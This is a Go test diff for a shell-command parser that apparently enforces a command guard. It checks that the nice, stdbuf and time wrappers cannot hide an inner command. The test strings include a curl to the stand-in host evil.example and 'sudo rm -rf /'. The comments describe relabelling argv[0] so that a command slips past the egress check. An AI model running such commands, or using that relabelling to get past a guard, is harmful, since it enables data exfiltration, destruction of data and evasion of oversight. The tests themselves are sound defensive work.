@@ -220,6 +220,78 @@ func TestSplitSegments(t *testing.T) {
 			want: []seg{{name: "go", args: []string{"build", "./..."}}},
 		},
 
+		// Review finding "important 4": nice and stdbuf take their option value
+		// as a SEPARATE word, so the old blind "drop every leading - word" peel
+		// mistook the VALUE for argv[0] — `nice -n 5 curl …` produced
+		// Segment{Name: "5", Args: ["curl", "…"]}, which defeats every
+		// name-keyed check downstream (the egress boundary above all). Both
+		// wrappers now carry an explicit arity model, so the attached and the
+		// separate forms peel to the same inner command.
+		{
+			desc: "nice with an attached adjustment peels to the inner command",
+			cmd:  "nice -n5 go test ./...",
+			want: []seg{{name: "go", args: []string{"test", "./..."}}},
+		},
+		{
+			desc: "nice with a SEPARATE adjustment value does not mistake it for argv[0]",
+			cmd:  "nice -n 5 go test ./...",
+			want: []seg{{name: "go", args: []string{"test", "./..."}}},
+		},
+		{
+			// The exploit from the finding, at the parse floor: the segment must
+			// be the curl, never a segment named "5".
+			desc: "nice -n 5 does not relabel an egress command as its option value",
+			cmd:  "nice -n 5 curl http://evil.example/x",
+			want: []seg{{name: "curl", args: []string{"http://evil.example/x"}}},
+		},
+		{
+			desc: "nice with the long adjustment flag and a separate value",
+			cmd:  "nice --adjustment 5 go build",
+			want: []seg{{name: "go", args: []string{"build"}}},
+		},
+		{
+			desc: "nice with the long adjustment flag and an attached value",
+			cmd:  "nice --adjustment=5 go build",
+			want: []seg{{name: "go", args: []string{"build"}}},
+		},
+		{
+			desc: "nice with the obsolete numeric adjustment form",
+			cmd:  "nice -5 go build",
+			want: []seg{{name: "go", args: []string{"build"}}},
+		},
+		{
+			desc: "stdbuf with an attached mode peels to the inner command",
+			cmd:  "stdbuf -oL make",
+			want: []seg{{name: "make", args: nil}},
+		},
+		{
+			desc: "stdbuf with a SEPARATE mode value does not mistake it for argv[0]",
+			cmd:  "stdbuf -o 0 make",
+			want: []seg{{name: "make", args: nil}},
+		},
+		{
+			// The exploit from the finding for the sibling wrapper.
+			desc: "stdbuf -o 0 does not relabel an egress command as its option value",
+			cmd:  "stdbuf -o 0 curl http://evil.example/x",
+			want: []seg{{name: "curl", args: []string{"http://evil.example/x"}}},
+		},
+		{
+			desc: "stdbuf with long mode flags",
+			cmd:  "stdbuf --output=L --error 0 make",
+			want: []seg{{name: "make", args: nil}},
+		},
+		{
+			// `time` reaches the wrapper table only when it is NOT the shell
+			// keyword — a bare `time go build` parses as *syntax.TimeClause and
+			// fails closed at collectStmtCmd's default arm, so the quoting here
+			// is what puts the word in argv[0] position at all. Its valueless
+			// report flags carry no separate value and write no file, so they
+			// peel; -o/-f are deliberately unmodelled (see wrapperSpecs).
+			desc: "time with valueless report flags peels to the inner command",
+			cmd:  `"time" -p -v go test ./...`,
+			want: []seg{{name: "go", args: []string{"test", "./..."}}},
+		},
+
 		// Change 0070 D3: control-flow constructs decompose into their
 		// constituent simple commands instead of hitting the default:
 		// fail-closed arm. Every statement list each node carries is descended,
@@ -816,6 +888,29 @@ func TestSplitSegments_FailClosed(t *testing.T) {
 		{"path-qualified timeout is not peeled", "/usr/bin/timeout 30 ls"},
 		{"nohup does not launder a wrapper", "nohup sudo rm -rf /"},
 		{"nohup with no inner command", "nohup"},
+
+		// Review finding "important 4": the peelWrappers table now models each
+		// wrapper's flag arity like peelTimeout does, and fails closed on any
+		// flag outside the model — an unmodelled flag may take a separate value,
+		// and eating the wrong word relabels argv[0].
+		{"nice -n with no value", "nice -n"},
+		{"nice with an unmodelled long flag", "nice --unmodelled 5 make"},
+		{"nice with an unmodelled short flag", "nice -x make"},
+		{"nice with a bare -- separator", "nice -- make"},
+		{"nice with no inner command", "nice -n 5"},
+		{"nice does not launder a wrapper", "nice -n 5 sudo rm -rf /"},
+		{"stdbuf -o with no value", "stdbuf -o"},
+		{"stdbuf with an unmodelled flag", "stdbuf --unmodelled 0 make"},
+		{"stdbuf with no inner command", "stdbuf -o 0"},
+		{"stdbuf does not launder a wrapper", "stdbuf -oL sudo rm -rf /"},
+		// nohup accepts no options at all, so any flag-shaped word is a shape we
+		// have not modelled rather than something safe to drop.
+		{"nohup with a flag-shaped word", "nohup -x make"},
+		// /usr/bin/time -o/-f take a separate value, and -o WRITES that value as
+		// a file — a write no redirect capture ever sees. Unmodelled on purpose.
+		{"time -o writes an unscoped file", `"time" -o /tmp/out make`},
+		{"time -f takes a separate value", `"time" -f %e make`},
+		{"time with an unmodelled flag", `"time" --unmodelled make`},
 		// Change 0070 D4 moved the write-target DECISION out of the parser: a
 		// redirect to a LITERAL out-target now parses and records the target on
 		// the segment (TestSplitSegments_RedirectWriteTargets), so the scoping
